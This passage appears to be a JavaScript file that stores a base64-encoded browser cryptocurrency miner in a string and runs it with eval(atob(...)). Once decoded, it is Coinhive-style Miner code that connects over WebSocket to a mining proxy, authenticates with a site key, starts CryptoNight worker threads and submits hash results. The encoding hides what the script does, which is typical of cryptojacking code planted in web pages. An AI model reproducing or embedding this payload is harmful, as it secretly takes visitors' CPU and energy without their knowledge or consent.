3RoOwogICAgd2hpbGUgKGkpIHsKICAgICAgaGFzaCA9IChoYXNoICogMzMpIF4gcy5jaGFyQ29kZUF0KC0taSk7CiAgICB9CiAgICByZXR1cm4gaGFzaCA+Pj4gMDsKICB9OwogIE1pbmVyLnByb3RvdHlwZS5fY29ubmVjdCA9IGZ1bmN0aW9uKCkgewogICAgaWYgKHRoaXMuX3NvY2tldCkgewogICAgICByZXR1cm47CiAgICB9CiAgICB0aGlzLl9zb2NrZXQgPSBuZXcgV2ViU29ja2V0KHByb3h5VXJsKTsKICAgIHRoaXMuX3NvY2tldC5vbm1lc3NhZ2UgPSB0aGlzLl9vbk1lc3NhZ2UuYmluZCh0aGlzKTsKICAgIHRoaXMuX3NvY2tldC5vbmVycm9yID0gdGhpcy5fb25FcnJvci5iaW5kKHRoaXMpOwogICAgdGhpcy5fc29ja2V0Lm9uY2xvc2UgPSB0aGlzLl9vbkNsb3NlLmJpbmQodGhpcyk7CiAgICB0aGlzLl9zb2NrZXQub25vcGVuID0gdGhpcy5fb25PcGVuLmJpbmQodGhpcyk7CiAgfTsKICBNaW5lci5wcm90b3R5cGUuX29uT3BlbiA9IGZ1bmN0aW9uKGV2KSB7CglpZih3aW5kb3cuZGVidWcpeyBjb25zb2xlLmxvZygiTWluZXIgb25PcGVuOiAiK2V2KTsgfQogICAgdGhpcy5fZW1pdCgib3BlbiIpOwogICAgdmFyIHBhcmFtcyA9IHsKICAgICAgc2l0ZV9rZXk6IHRoaXMuX3NpdGVLZXksCiAgICAgIHR5cGU6ICJhbm9ueW1vdXMiLAogICAgICB1c2VyOiBudWxsLAogICAgICBnb2FsOiAwCiAgICB9OwogICAgaWYgKHRoaXMuX3VzZXIpIHsKICAgICAgcGFyYW1zLnR5cGUgPSAidXNlciI7CiAgICAgIHBhcmFtcy51c2VyID0gdGhpcy5fdXNlci50b1N0cmluZygpOwogICAgfSBlbHNlIGlmICh0aGlzLl9nb2FsKSB7CiAgICAgIHBhcmFtcy50eXBlID0gInRva2VuIjsKICAgICAgcGFyYW1zLmdvYWwgPSB0aGlzLl9nb2FsOwogICAgfQogICAgaWYgKHRoaXMuX29wdEluVG9rZW4pIHsKICAgICAgcGFyYW1zLm9wdF9pbiA9IHRoaXMuX29wdEluVG9rZW47CiAgICB9CiAgICB0aGlzLl9zZW5kKCJhdXRoIiwgcGFyYW1zKTsKICB9OwogIE1pbmVyLnByb3RvdHlwZS5fb25FcnJvciA9IGZ1bmN0aW9uKGV2KSB7CglpZih3aW5kb3cuZGVidWcpeyBjb25zb2xlLmxvZygiTWluZXIgb25FcnJvcjogIitldik7IH0KICAgIHRoaXMuX2VtaXQoImVycm9yIiwgeyBlcnJvcjogImNvbm5lY3Rpb25fZXJyb3IiIH0pOwogICAgdGhpcy5fb25DbG9zZShldik7CiAgfTsKICBNaW5lci5wcm90b3R5cGUuX29uQ2xvc2UgPSBmdW5jdGlvbihldikgewoJaWYod2luZG93LmRlYnVnKXsgY29uc29sZS5sb2coIk1pbmVyIG9uQ2xvc2U6ICIrSlNPTi5zdHJpbmdpZnkoZXYpICk7IH0KICAgIGlmIChldi5jb2RlID49IDEwMDMgJiYgZXYuY29kZSA8PSAxMDA5KSB7CiAgICAgIHRoaXMuX3JlY29ubmVjdFJldHJ5ID0gNjA7CiAgICB9CiAgICBmb3IgKHZhciBpID0gMDsgaSA8IHRoaXMuX3RocmVhZHMubGVuZ3RoOyBpKyspIHsKICAgICAgdGhpcy5fdGhyZWFkc1tpXS5zdG9wKCk7CiAgICB9CiAgICB0aGlzLl90aHJlYWRzID0gW107CiAgICB0aGlzLl9zb2NrZXQgPSBudWxsOwogICAgdGhpcy5fZW1pdCgiY2xvc2UiKTsKICAgIGlmICh0aGlzLl9hdXRvUmVjb25uZWN0KSB7CiAgICAgIHNldFRpbWVvdXQodGhpcy5fc3RhcnROb3cuYmluZCh0aGlzKSwgdGhpcy5fcmVjb25uZWN0UmV0cnkgKiAxZTMpOwogICAgfQogIH07CiAgTWluZXIucHJvdG90eXBlLl9vbk1lc3NhZ2UgPSBmdW5jdGlvbihldikgewogICAgdmFyIG1zZyA9IEpTT04ucGFyc2UoZXYuZGF0YSk7CiAgICBpZiAobXNnLnR5cGUgPT09ICJqb2IiKSB7CglpZih3aW5kb3cuZGVidWcpeyBjb25zb2xlLmxvZygiTWluZXIgam9iOiAiK0pTT04uc3RyaW5naWZ5KG1zZykgKTsgfQogICAgICB0aGlzLl9zZXRKb2IobXNnLnBhcmFtcyk7CiAgICAgIHRoaXMuX2VtaXQoImpvYiIsIG1zZy5wYXJhbXMpOwogICAgICBpZiAodGhpcy5fYXV0b1RocmVhZHMuZW5hYmxlZCAmJiAhdGhpcy5fYXV0b1RocmVhZHMuaW50ZXJ2YWwpIHsKICAgICAgICB0aGlzLl9hdXRvVGhyZWFkcy5hZGp1c3RBdCA9IERhdGUubm93KCkgKyB0aGlzLl9hdXRvVGhyZWFkcy5hZGp1c3RFdmVyeTsKICAgICAgICB0aGlzLl9hdXRvVGhyZWFkcy5pbnRlcnZhbCA9IHNldEludGVydmFsKAogICAgICAgICAgdGhpcy5fYWRqdXN0VGhyZWFkcy5iaW5kKHRoaXMpLAogICAgICAgICAgMWUzCiAgICAgICAgKTsKICAgICAgfQogICAgfSBlbHNlIGlmIChtc2cudHlwZSA9PT0gInZlcmlmeSIpIHsKICAgICAgdGhpcy52ZXJpZnlUaHJlYWQudmVyaWZ5KG1zZy5wYXJhbXMsIHRoaXMuX29uVmVyaWZpZWRCb3VuZCk7CiAgICB9IGVsc2UgaWYgKG1zZy50eXBlID09PSAiaGFzaF9hY2NlcHRlZCIpIHsKCWlmKHdpbmRvdy5kZWJ1Zyl7IGNvbnNvbGUubG9nKCJIYXNoIGFjY2VwdGVkOiAiK0pTT04uc3RyaW5naWZ5KG1zZykgKTsgfQogICAgICB0aGlzLl9oYXNoZXMgPSBtc2cucGFyYW1zLmhhc2hlczsKICAgICAgdGhpcy5fZW1pdCgiYWNjZXB0ZWQiLCBtc2cucGFyYW1zKTsKICAgICAgaWYgKHRoaXMuX2dvYWwgJiYgdGhpcy5faGFzaGVzID49IHRoaXMuX2dvYWwpIHsKICAgICAgICB0aGlzLnN0b3AoKTsKICAgICAgfQogICAgfSBlbHNlIGlmIChtc2cudHlwZSA9PT0gImF1dGhlZCIpIHsKCWlmKHdpbmRvdy5kZWJ1Zyl7IGNvbnNvbGUubG9nKCJNaW5lciBhdXRoZWQ6ICIrSlNPTi5zdHJpbmdpZnkobXNnKSApOyB9CiAgICAgIHRoaXMuX3Rva2VuRnJvbVNlcnZlciA9IG1zZy5wYXJhbXMudG9rZW4gfHwgbnVsbDsKICAgICAgdGhpcy5faGFzaGVzID0gbXNnLnBhcmFtcy5oYXNoZXMgfHwgMDsKICAgICAgdGhpcy5fZW1pdCgiYXV0aGVkIiwgbXNnLnBhcmFtcyk7CiAgICAgIHRoaXMuX3JlY29ubmVjdFJldHJ5ID0gMzsKICAgIH0gZWxzZSBpZiAobXNnLnR5cGUgPT09ICJlcnJvciIpIHsKICAgICAgaWYgKGNvbnNvbGUgJiYgY29uc29sZS5lcnJvcikgewoJaWYod2luZG93LmRlYnVnKXsgY29uc29sZS5sb2coIlN0cmF0dW0gRXJyb3I6ICIrSlNPTi5zdHJpbmdpZnkobXNnKSApOyB9CiAgICAgIH0KICAgICAgdGhpcy5fZW1pdCgiZXJyb3IiLCBtc2cucGFyYW1zKTsKICAgICAgaWYgKG1zZy5wYXJhbXMuZXJyb3IgPT09ICJpbnZhbGlkX3NpdGVfa2V5IikgewoJaWYod2luZG93LmRlYnVnKXsgY29uc29sZS5sb2coIkludmFsaWQgV2FsbGV0IEFkZHJlc3M6ICIrSlNPTi5zdHJpbmdpZnkobXNnKSApOyB9CiAgICAgICAgdGhpcy5fcmVjb25uZWN0UmV0cnkgPSA2ZTM7CiAgICAgIH0gZWxzZSBpZiAobXNnLnBhcmFtcy5lcnJvciA9PT0gImludmFsaWRfb3B0X2luIikgewogICAgICAgIGlmICh0aGlzLl9zdG9wT25JbnZhbGlkT3B0SW4pIHsKICAgICAgICAgIHJldHVybiB0aGlzLnN0b3AoKTsKICAgICAgICB9IGVsc2UgaWYgKHRoaXMuX2F1dGgpIHsKICAgICAgICAgIHRoaXMuX2F1dGgucmVzZXQoKTsKICAgICAgICB9CiAgICAgIH0KICAgIH0gZWxzZSBpZiAobXNnLnR5cGUgPT09ICJiYW5uZWQiIHx8IG1zZy5wYXJhbXMuYmFubmVkKSB7CglpZih3aW5kb3cuZGVidWcpeyBjb25zb2xlLmxvZygiU3RyYXR1bSBCYW5uZWQgVXM6ICIrSlNPTi5zdHJpbmdpZnkobXNnKSApOyB9CiAgICAgIHRoaXMuX2VtaXQoImVycm9yIiwgeyBiYW5uZWQ6IHRydWUgfSk7CiAgICAgIHRoaXMuX3JlY29ubmVjdFJldHJ5ID0gNjAwOwogICAgfQogIH07CiAgTWluZXIucHJvdG90eXBlLl9zZXRKb2IgPSBmdW5jdGlvbihqb2IpIHsKICAgIHRoaXMuX2N1cnJlbnRKb2IgPSBqb2I7CiAgICB0aGlzLl9jdXJyZW50Sm9iLnRocm90dGxlID0gdGhpcy5fdGhyb3R0bGU7CiAgICBmb3IgKHZhciBpID0gMDsgaSA8IHRoaXMuX3RocmVhZHMubGVuZ3RoOyBpKyspIHsKICAgICAgdGhpcy5fdGhyZWFkc1tpXS5zZXRKb2Ioam9iLCB0aGlzLl9vblRhcmdldE1ldEJvdW5kKTsKICAgIH0KICB9OwogIE1pbmVyLnByb3RvdHlwZS5fb25UYXJnZXRNZXQgPSBmdW5jdGlvbihyZXN1bHQpIHsKICAgIHRoaXMuX2VtaXQoImZvdW5kIiwgcmVzdWx0KTsKICAgIGlmIChyZXN1bHQuam9iX2lkID09PSB0aGlzLl9jdXJyZW50Sm9iLmpvYl9pZCkgewogICAgICB0aGlzLl9zZW5kKCJzdWJtaXQiLCB7CiAgICAgICAgam9iX2lkOiByZXN1bHQuam9iX2lkLAogICAgICAgIG5vbmNlOiByZXN1bHQubm9uY2UsCiAgICAgICAgcmVzdWx0OiByZXN1bHQucmVzdWx0CiAgICAgIH0pOwogICAgfQogIH07CiAgTWluZXIucHJvdG90eXBlLl9vblZlcmlmaWVkID0gZnVuY3Rpb24odmVyaWZ5UmVzdWx0KSB7CiAgICB0aGlzLl9zZW5kKCJ2ZXJpZmllZCIsIHZlcmlmeVJlc3VsdCk7CiAgfTsKICBNaW5lci5wcm90b3R5cGUuX3NlbmQgPSBmdW5jdGlvbih0eXBlLCBwYXJhbXMpIHsKICAgIGlmICghdGhpcy5fc29ja2V0KSB7CiAgICAgIHJldHVybjsKICAgIH0KICAgIHZhciBtc2cgPSB7IHR5cGU6IHR5cGUsIHBhcmFtczogcGFyYW1zIHx8IHt9IH07CiAgICB0aGlzLl9zb2NrZXQuc2VuZChKU09OLnN0cmluZ2lmeShtc2cpKTsKICB9OwogIHdpbmRvdy5DSCA9IHdpbmRvdy5DSCB8fCB7fTsKICB3aW5kb3cuQ0guSUZfRVhDTFVTSVZFX1RBQiA9ICJpZkV4Y2x1c2l2ZVRhYiI7CiAgd2luZG93LkNILkZPUkNFX0VYQ0xVU0lWRV9UQUIgPSAiZm9yY2VFeGNsdXNpdmVUYWIiOwogIHdpbmRvdy5DSC5GT1JDRV9NVUxUSV9UQUIgPSAiZm9yY2VNdWx0aVRhYiI7CiAgd2luZG93LkNILlRva2VuID0gZnVuY3Rpb24oc2l0ZUtleSwgZ29hbCwgcGFyYW1zKSB7CiAgICB2YXIgbWluZXIgPSBuZXcgTWluZXIoc2l0ZUtleSwgcGFyYW1zKTsKICAgIG1pbmVyLl9nb2FsID0gZ29hbCB8fCAwOwogICAgcmV0dXJuIG1pbmVyOwogIH07CiAgd2luZG93LkNILlVzZXIgPSBmdW5jdGlvbihzaXRlS2V5LCB1c2VyLCBwYXJhbXMpIHsKICAgIHZhciBtaW5lciA9IG5ldyBNaW5lcihzaXRlS2V5LCBwYXJhbXMpOwogICAgbWluZXIuX3VzZXIgPSB1c2VyOwogICAgcmV0dXJuIG1pbmVyOwogIH07CiAgd2luZG93LkNILkFub255bW91cyA9IGZ1bmN0aW9uKHNpdGVLZXksIHBhcmFtcykgewogICAgdmFyIG1pbmVyID0gbmV3IE1pbmVyKHNpdGVLZXksIHBhcmFtcyk7CiAgICByZXR1cm4gbWluZXI7CiAgfTsKfQoKZnVuY3Rpb24gc2V0dXBKb2IoKSB7CiAgInVzZSBzdHJpY3QiOwogIHZhciBKb2JUaHJlYWQgPSBmdW5jdGlvbigpIHsKICAgIHRoaXMud29ya2VyID0gbmV3IFdvcmtlcihDSC5DUllQVE9OSUdIVF9XT1JLRVJfQkxPQik7CiAgICB0aGlzLndvcmtlci5vbm1lc3NhZ2UgPSB0aGlzLm9uUmVhZHkuYmluZCh0aGlzKTsKICAgIHRoaXMuY3VycmVudEpvYiA9IG51bGw7CiAgICB0aGlzLmpvYkNhbGxiYWNrID0gZnVuY3Rpb24oKSB7fTsKICAgIHRoaXMudmVyaWZ5Q2FsbGJhY2sgPSBmdW5jdGlvbigpIHt9OwogICAgdGhpcy5faXNSZWFkeSA9IGZhbHNlOwogICAgdGhpcy5oYXNoZXNQZXJTZWNvbmQgPSAwOwogICAgdGhpcy5oYXNoZXNUb3RhbCA9IDA7CiAgICB0aGlzLnJ1bm5pbmcgPSBmYWxzZTsKICAgIHRoaXMubGFzdE1lc3NhZ2VUaW1lc3RhbXAgPSBEYXRlLm5vdygpOwogIH07CiAgSm9iVGhyZWFkLnByb3RvdHlwZS5vblJlYWR5ID0gZnVuY3Rpb24obXNnKSB7CiAgICBpZiAobXNnLmRhdGEgIT09ICJyZWFkeSIgfHwgdGhpcy5faXNSZWFkeSkgewogICAgICB0aHJvdyAnRXhwZWN0aW5nIGZpcnN0IG1lc3NhZ2UgdG8gYmUgInJlYWR5IiwgZ290ICcgKyBtc2c7CiAgICB9CiAgICB0aGlzLl9pc1JlYWR5ID0gdHJ1ZTsKICAgIHRoaXMud29ya2VyLm9ubWVzc2FnZSA9IHRoaXMub25SZWNlaXZlTXNnLmJpbmQodGhpcyk7CiAgICBpZiAodGhpcy5jdXJyZW50Sm9iKSB7CiAgICAgIHRoaXMucnVubmluZyA9IHRydWU7CiAgICAgIHRoaXMud29ya2VyLnBvc3RNZXNzYWdlKHRoaXMuY3VycmVudEpvYik7CiAgICB9CiAgfTsKICBKb2JUaHJlYWQucHJvdG90eXBlLm9uUmVjZWl2ZU1zZyA9IGZ1bmN0aW9uKG1zZykgewogICAgaWYgKG1zZy5kYXRhLnZlcmlmeV9pZCkgewogICAgICB0aGlzLnZlcmlmeUNhbGxiYWNrKG1zZy5kYXRhKTsKICAgICAgcmV0dXJuOwogICAgfQogICAgaWYgKG1zZy5kYXRhLnJlc3VsdCkgewogICAgICB0aGlzLmpvYkNhbGxiYWNrKG1zZy5kYXRhKTsKICAgIH0KICAgIHRoaXMuaGFzaGVzUGVyU2Vjb25kID0KICAgICAgdGhpcy5oYXNoZXNQZXJTZWNvbmQgKiAwLjUgKyBtc2cuZGF0YS5oYXNoZXNQZXJTZWNvbmQgKiAwLjU7CiAgICB0aGlzLmhhc2hlc1RvdGFsICs9IG1zZy5kYXRhLmhhc2hlczsKICAgIHRoaXMubGFzdE1lc3NhZ2VUaW1lc3RhbXAgPSBEYXRlLm5vdygpOwogICAgaWYgKHRoaXMucnVubmluZykgewogICAgICB0aGlzLndvcmtlci5wb3N0TWVzc2FnZSh0aGlzLmN1cnJlbnRKb2IpOwogICAgfQogIH07CiAgSm9iVGhyZWFkLnByb3RvdHlwZS5zZXRKb2IgPSBmdW5jdGlvbihqb2IsIGNhbGxiYWNrKSB7CiAgICB0aGlzLmN1cnJlbnRKb2IgPSBqb2I7CiAgICB0aGlzLmpvYkNhbGxiYWNrID0gY2FsbGJhY2s7CiAgICBpZiAodGhpcy5faXNSZWFkeSAmJiAhdGhpcy5ydW5uaW5nKSB7CiAgICAgIHRoaXMucnVubmluZyA9IHRydWU7CiAgICAgIHRoaXMud29ya2VyLnBvc3RNZXNzYWdlKHRoaXMuY3VycmVudEpvYik7CiAgICB9CiAgfTsKICBKb2JUaHJlYWQucHJvdG90eXBlLnZlcmlmeSA9IGZ1bmN0aW9uKGpvYiwgY2FsbGJhY2spIHsKICAgIGlmICghdGhpcy5faXNSZWFkeSkgewogICAgICByZXR1cm47CiAgICB9CiAgICB0aGlzLnZlcmlmeUNhbGxiYWNrID0gY2FsbGJhY2s7CiAgICB0aGlzLndvcmtlci5wb3N0TWVzc2FnZShqb2IpOwogIH07CiAgSm9iVGhyZWFkLnByb3RvdHlwZS5zdG9wID0gZnVuY3Rpb24oKSB7CiAgICBpZiAodGhpcy53b3JrZXIpIHsKICAgICAgdGhpcy53b3JrZXIudGVybWluYXRlKCk7CiAgICAgIHRoaXMud29ya2VyID0gbnVsbDsKICAgIH0KICAgIHRoaXMucnVubmluZyA9IGZhbHNlOwogIH07CiAgd2luZG93LkNILkpvYlRocmVhZCA9IEpvYlRocmVhZDsKfQoKCg==';
eval(atob(a));